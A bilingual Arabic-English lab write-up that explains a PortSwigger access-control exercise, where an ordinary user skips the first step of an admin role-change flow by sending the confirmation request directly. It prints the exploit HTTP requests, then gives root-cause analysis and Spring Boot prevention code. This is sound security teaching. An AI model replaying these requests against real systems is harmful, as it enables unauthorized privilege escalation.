# 12 — Multi-step process with no access control on one step

| | |
|---|---|
| **المصدر / Source** | [PortSwigger Lab](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step) |
| **المستوى / Level** | Practitioner |
| **تاريخ التوثيق / Documented** | 2026-11-04 (توثيق بأثر رجعي) |
| **الحالة / Status** | ✅ Solved |

---

## 🇸🇦 النسخة العربية

### ١. وصف الثغرة
لوحة الإدارة تغيير دور المستخدم عبر **عمليتين**: خطوة أولى محمية بصلاحية المدير، وخطوة تأكيد ثانية (`confirmed=true`) **بدون أي فحص صلاحية**. يمكن للمستخدم العادي إرسال طلب الخطوة الثانية مباشرةً متجاوزًا الخطوة الأولى.

- **النوع:** Vertical Privilege Escalation — Multi-step process / Missing function-level access control.
- **بيانات الدخول:** `wiener:peter` (وللاستكشاف: `administrator:admin`).
- **الهدف:** ترقية `wiener` إلى مدير.

### ٢. كيف استغلّيتها
1. دخلت كمدير (`administrator:admin`) وفتحت لوحة الإدارة.
2. اخترت ترقية المستخدم `wiener`، وراقبت الطلب الأول:
   ```http
   POST /admin-roles HTTP/1.1
   Content-Type: application/x-www-form-urlencoded

   username=wiener&action=upgrade
   ```
3. ظهرت صفحة تأكيد، وعند الضغط على **Confirm** أُرسل الطلب الثاني:
   ```http
   POST /admin-roles HTTP/1.1
   Content-Type: application/x-www-form-urlencoded

   username=wiener&action=upgrade&confirmed=true
   ```
4. سجّلت الخروج ودخلت بـ`wiener:peter`.
5. أرسلت طلب **الخطوة الثانية فقط** بجلسة `wiener`:
   ```http
   POST /admin-roles HTTP/1.1
   Host: <lab-host>
   Cookie: session=<wiener-session>
   Content-Type: application/x-www-form-urlencoded

   username=wiener&action=upgrade&confirmed=true
   ```
6. تمت الترقية دون المرور بالخطوة الأولى.

**النتيجة:** تجاوز تدفق إداري كامل بإرسال الخطوة النهائية مباشرةً.

### ٣. السبب الجذري (Root Cause)
- **التحقق موجود في خطوة واحدة فقط** من العملية.
- السيرفر **يفترض** أن المستخدم وصل للخطوة الثانية عبر الأولى، دون التحقق من ذلك.
- الـ`confirmed=true` مجرد حقل يتحكم به العميل، وليس دليلًا على إتمام الخطوة الأولى.
- لا توجد **State Machine** على السيرفر تربط الخطوات بالجلسة والمستخدم.

> هذا هو جوهر الثغرة: *التحقق من الصلاحية لكل خطوة، وليس لكل عملية.*

### ٤. كيف أمنعها في Java Spring Boot
**١) افحص الصلاحية في كل خطوة، وليس في البداية فقط:**

```java
@PostMapping("/admin/roles/confirm")
@PreAuthorize("hasRole('ADMIN')") // إلزامي حتى في خطوة التأكيد
public void confirmRoleChange(@RequestBody @Valid ConfirmRoleChangeRequest req) {
    roleService.confirm(req);
}
```

**٢) استبدل `confirmed=true` بـ**State Token** مُوقّع ومرتبط بالجلسة، وصالح لمرة واحدة:**

```java
public record ConfirmRoleChangeRequest(
    String username,
    Role targetRole,
    UUID confirmationToken
) {}
```

```java
@PreAuthorize("hasRole('ADMIN')")
public void confirm(ConfirmRoleChangeRequest req) {
    PendingChange pending = pendingChanges.consume(req.confirmationToken())
        .orElseThrow(() -> new AccessDeniedException("Invalid or expired confirmation"));

    if (!pending.getRequestedBy().equals(currentUser().getId())) {
        throw new AccessDeniedException("Token does not belong to this user");
    }

    applyRoleChange(pending.getUsername(), pending.getTargetRole());
}
```

**٣) لا تعتمد على حقول مخفية في HTML لتحديد "الخطوة الحالية":**

```html
<!-- خطأ: يمكن تعديله -->
<input type="hidden" name="confirmed" value="true">
```

**٤) طبّق قاعدة "Deny by default" على كل مسارات `/admin/**`، ثم أضف تحققًا خاصًا لكل خطوة.**

- **قاعدة مراجعة:** أي عملية متعددة الخطوات (Checkout, Transfer, Role Change, Password Reset) — افحص كل Endpoint فيها على حدة.
- **قاعدة تصميم:** حالة العملية تُحفظ على السيرفر (Session/DB)، لا في حقول يرسلها العميل.

### ٥. درس مستفاد
"المستخدم لن يصل لهذه الخطوة إلا بعد الخطوة السابقة" افتراض خاطئ. كل خطوة هي Endpoint مستقل، وكل Endpoint يحتاج تحققًا مستقلًا. هذا الدرس ينطبق مباشرة على:
- عمليات الدفع متعددة الخطوات.
- تغيير كلمة المرور / البريد.
- الموافقات الإدارية.
- أي Wizard في Angular + Spring Boot.

### ٦. أسئلة للتفكير
1. كيف أصمم State Machine آمنة لعملية متعددة الخطوات في Spring Boot؟
2. ما الفرق بين `confirmationToken` عشوائي و`confirmationToken` موقّع (HMAC/JWT)؟
3. لو كانت الخطوة الثانية محمية لكن الأولى غير محمية، هل تُستغل الثغرة؟ وكيف؟
4. كيف أكتشف هذه الفئة أثناء مراجعة كود مشروع حقيقي؟ (ابحث عن `confirmed`, `step`, `stage`, `next`)

---

## 🇬🇧 English Version

### 1. Vulnerability
Changing a user's role is a multi-step process. The first step is protected by an admin check, but the confirmation step (`confirmed=true`) has no access control. A normal user can send the second request directly and skip the first step.

### 2. Exploitation
As `administrator`, observe the role change flow:
```http
POST /admin-roles
username=wiener&action=upgrade
```
Then confirm with:
```http
POST /admin-roles
username=wiener&action=upgrade&confirmed=true
```
Log in as `wiener` and send only the confirmation request:
```http
POST /admin-roles HTTP/1.1
Cookie: session=<wiener-session>
Content-Type: application/x-www-form-urlencoded

username=wiener&action=upgrade&confirmed=true
```
The user is promoted without completing step one.

### 3. Root Cause
- Authorization exists on only one step of the process.
- The server assumes step two is reachable only after step one.
- `confirmed=true` is a client-controlled flag, not proof of prior approval.
- No server-side state machine binds the steps to the session and user.

### 4. Prevention in Java Spring Boot
Authorize every step:

```java
@PostMapping("/admin/roles/confirm")
@PreAuthorize("hasRole('ADMIN')")
public void confirm(@RequestBody @Valid ConfirmRoleChangeRequest req) { ... }
```
Replace `confirmed=true` with a signed, single-use state token bound to the session and user. Store workflow state server-side; never rely on hidden fields to indicate the current step.

### 5. Lesson Learned
“The user cannot reach this step without the previous one” is a dangerous assumption. Every step is an independent endpoint and needs its own authorization check. This applies to checkout, password reset, admin approvals, and any Angular + Spring wizard.

### 6. Reflection Questions
1. How would you design a secure state machine for a multi-step flow in Spring Boot?
2. What is the difference between a random confirmation token and a signed one?
3. If step two is protected but step one is not, is the flow still exploitable?
4. How would you spot this class during code review? (look for `confirmed`, `step`, `stage`, `next`)
